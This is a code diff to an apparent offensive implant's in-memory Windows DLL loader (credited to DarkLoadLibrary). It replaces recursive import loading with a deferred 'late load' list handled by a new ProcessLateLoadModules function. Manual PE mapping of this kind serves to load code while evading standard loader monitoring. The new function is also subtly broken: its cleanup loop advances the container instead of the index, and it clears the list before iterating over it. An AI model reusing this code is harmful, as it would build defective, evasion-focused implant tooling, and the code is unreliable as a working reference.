@@ -403,7 +403,7 @@ namespace Modules {
         return true;
     }
 
-	BOOL ResolveImports(CONST EXECUTABLE *mod) {
+	BOOL ResolveImports(CONST EXECUTABLE *mod, VECTOR<LATE_LOAD_ENTRY>& late_loads) {
 		HEXANE; 
 
 		UINT8 buffer[MAX_PATH] = { };
@@ -424,23 +424,13 @@ namespace Modules {
 					return false;
 				}
 
-				/*
-				  TODO: add unloaded modules to a list of "LateLoad" modules instead of calling ImportModule recursively
-				  Debugging recursive calls is an absolute fucking nightmare and I hate it.
-				  Would be much better to add them to a late loading process and calling importmod with a depth of 1.
-				 */
 				/* looking for msvcrt.dll, both of these calls failed for unknown reason */
 				if (PLDR_DATA_TABLE_ENTRY dep = FindModuleEntry(hash)) {
 					volatile auto temp = dep->DllBase;
 					lib = temp;
 				} else {
-					PEXECUTABLE next_load = ImportModule(LoadLocalFile, hash, nullptr, 0, nullptr, false);
-					if (!next_load || !next_load->base) {
-						return false;
-					}
-
-					lib = next_load->base;
-					CleanupModule(&next_load, false);
+					push_back(late_loads, { hash, nullptr });
+					continue;
 				}
 
 				PIMAGE_THUNK_DATA first_thunk = RVA(PIMAGE_THUNK_DATA, mod->base, import_desc->FirstThunk);
@@ -483,13 +473,8 @@ namespace Modules {
 					volatile auto temp = dep->DllBase;
 					lib = temp;
 				} else {
-					PEXECUTABLE next_load = ImportModule(LoadLocalFile, hash, nullptr, 0, nullptr, false);
-					if (!next_load || !next_load->base) {
-						return false;
-					}
-
-					lib = next_load->base;
-					CleanupModule(&next_load, false);
+					push_back(late_loads, { hash, nullptr });
+					continue;
 				}
 
 				PIMAGE_THUNK_DATA first_thunk = RVA(PIMAGE_THUNK_DATA, mod->base, delay_desc->ImportAddressTableRVA);
@@ -780,10 +765,60 @@ namespace Modules {
         return true;
     }
 
-    PEXECUTABLE ImportModule(CONST UINT32 load_type, CONST UINT32 name_hash, UINT8 *memory, CONST UINT32 mem_size, WCHAR *name, BOOL cache) {
-        // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
-        HEXANE;
+#define MAX_PROCESSED_MODULES 32
+	BOOL ProcessLateLoadModules(VECTOR<LATE_LOAD_ENTRY>& mods) {
 
+		UINT32 processed_mods[MAX_PROCESSED_MODULES] = { };
+		UINT32 processed_count = 0;
+		BOOL success = false;
+
+		for (auto entry = 0; mods[entry]; entry++) {
+			BOOL processed = false;
+
+			for (auto i = 0; i < processed_count; i++) {
+				if (processed_mods[i] == mods[entry].hash) {
+					processed = true;
+					break;
+				}
+			}
+			if (processed) {
+				continue;
+			}
+
+			mods[entry].mod = ImportModule(LoadLocalFile, mods[entry].hash, nullptr, 0, nullptr, false);
+			if (!mods[entry].mod || !mods[entry].mod->success) {
+				goto defer;  
+			}
+
+			if (processed_count < MAX_PROCESSED_MODULES) {
+				processed_mods[processed_count++] = mods[entry].hash;
+			}
+		}
+
+		for (auto entry = 0; mods[entry]; entry++) {
+			if (mods[entry].mod && !ResolveImports(mods[entry].mod, mods)) {
+				goto defer;
+			}
+		}
+
+		mods.clear();
+		success = true;
+
+	defer:
+		for (auto entry = 0; mods[entry]; mods++) {
+			if (mods[entry].mod) {
+				CleanupModule(&mods[entry].mod, !success);
+			}
+		}
+
+		return success;
+	}
+
+	PEXECUTABLE ImportModule(CONST UINT32 load_type, CONST UINT32 name_hash, UINT8 *memory, CONST UINT32 mem_size, WCHAR *name, BOOL cache) {
+        HEXANE;
+        // Code based off of https://github.com/bats3c/DarkLoadLibrary
+
+		VECTOR<LATE_LOAD_ENTRY> late_loads;
         EXECUTABLE *mod = (EXECUTABLE*)ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
         if (!mod) {
             return nullptr;
@@ -840,24 +875,12 @@ namespace Modules {
             goto defer;
         }
 
-        // map the sections into memory
-		struct LATE_LOAD_ENTRY {
-			UINT32 hash;
-			PEXECUTABLE mod;
-		};
-
-		SimpleVector<LATE_LOAD_ENTRY> late_loads;
 		init_vector(late_loads);
-
-        if (!MapModule(mod) || !ResolveImports(mod /*, late_loads*/)) {
-            goto defer;
-        }
-
-		/*
-		if (!ProcessLateLoadModules(late_loads)) {
+		if (!MapModule(mod) || !ResolveImports(mod, late_loads) || !ProcessLateLoadModules(late_loads)) {
 			goto defer;
 		}
-		*/
+
+		free_vector(late_loads);
 
 		if (mod->link) {
             if (!LinkModule(mod)) {
@@ -865,8 +888,7 @@ namespace Modules {
             }
         }
 
-        // trigger tls callbacks, set permissions and call the entry point
-		/*
+		/* TODO: trigger tls callbacks, set permissions and call the entry point
 				if (!BeginExecution(mod)) {
 					goto defer;
 				}
